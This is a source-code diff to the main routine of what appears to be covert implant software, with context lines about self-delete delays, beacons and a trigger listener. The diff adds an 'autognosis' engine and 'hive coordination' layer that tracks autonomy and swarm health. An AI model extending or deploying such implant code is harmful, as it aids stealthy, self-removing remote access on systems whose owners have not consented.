@@ -25,6 +25,8 @@
 #include "crypto.h"
 #include "crypto_strings_main.h"
 #include "dns_protocol.h"
+#include "../autognosis/autognosis.h"
+#include "../autognosis/hive_coordination.h"
 #ifdef LINUX
 	#include "getopt.h"
 #endif
@@ -464,10 +466,72 @@ patched_binary:	// Parsing of command line arguments skipped for patched binarie
 	// delete_delay
 	DLX(1, printf("Self delete delay: %lu.\n", delete_delay));
 
+	// Initialize autognosis engine for hive-aware self-healing
+	DLX(1, printf("Initializing OpenCog autognosis engine...\n"));
+	char node_identity[64];
+	
+	// Generate robust node ID from multiple entropy sources
+	uint32_t node_id = ((uint32_t)time(NULL) ^ (uint32_t)getpid() ^ 
+	                   (uint32_t)((uintptr_t)&node_id >> 16)) % 0xFFFF;
+	if (node_id == 0) node_id = 1; // Ensure non-zero ID
+	
+	snprintf(node_identity, sizeof(node_identity), "hive_node_%u", node_id);
+	
+	autognosis_engine_t *autognosis = autognosis_create(node_identity);
+	hive_coordinator_t *hive_coord = NULL;
+	
+	if (autognosis) {
+		// Add this node to network topology
+		topology_add_node(autognosis->topology, node_id, beaconInfo.host ? beaconInfo.host : "localhost");
+		
+		// Start the autognosis engine
+		autognosis_start(autognosis);
+		DLX(1, printf("Autognosis engine started with identity: %s (ID: %u)\n", node_identity, node_id));
+		
+		// Initialize hive coordination
+		hive_coord = hive_coordinator_create(autognosis, node_id);
+		if (hive_coord) {
+			DLX(1, printf("Hive coordination enabled. Node ready for collective intelligence.\n"));
+			
+			// Add initial collective knowledge
+			atom_t *genesis_atom = atomspace_add_atom(autognosis->global_knowledge, 
+				ATOM_CONCEPT, "hive_genesis");
+			if (genesis_atom) {
+				atomspace_update_truth_value(genesis_atom, 1.0f, 1.0f);
+				genesis_atom->importance = 1.0f;
+			}
+		}
+		
+		// Perform initial self-image building
+		autognosis_cognitive_cycle(autognosis);
+		DLX(1, printf("Initial cognitive cycle completed. Health: %.2f, Autonomy: %.2f\n", 
+			autognosis->self_image->health_score, autognosis->self_image->autonomy_level));
+			
+		if (hive_coord && hive_coord->calculate_swarm_health) {
+			float swarm_health = hive_coord->calculate_swarm_health(hive_coord);
+			DLX(1, printf("Collective swarm health: %.2f, Emergence factor: %.2f\n", 
+				swarm_health, hive_calculate_emergence_factor(hive_coord)));
+		}
+	} else {
+		DLX(1, printf("Warning: Failed to initialize autognosis engine\n"));
+	}
+
 #ifndef __VALGRIND__
 	DLX(2, printf( "\tCalling TriggerListen()\n"));
-	(void)TriggerListen(trigger_delay, delete_delay);	//TODO: TriggerListen() doesn't return a meaningful value.
+	(void)TriggerListen(trigger_delay, delete_delay, autognosis, hive_coord);	//TODO: TriggerListen() doesn't return a meaningful value.
 #endif
+
+	// Clean up hive coordination and autognosis engine on exit
+	if (hive_coord) {
+		hive_coordinator_destroy(hive_coord);
+		DLX(1, printf("Hive coordination stopped and cleaned up\n"));
+	}
+	
+	if (autognosis) {
+		autognosis_stop(autognosis);
+		autognosis_destroy(autognosis);
+		DLX(1, printf("Autognosis engine stopped and cleaned up\n"));
+	}
 
     return 0;
 }
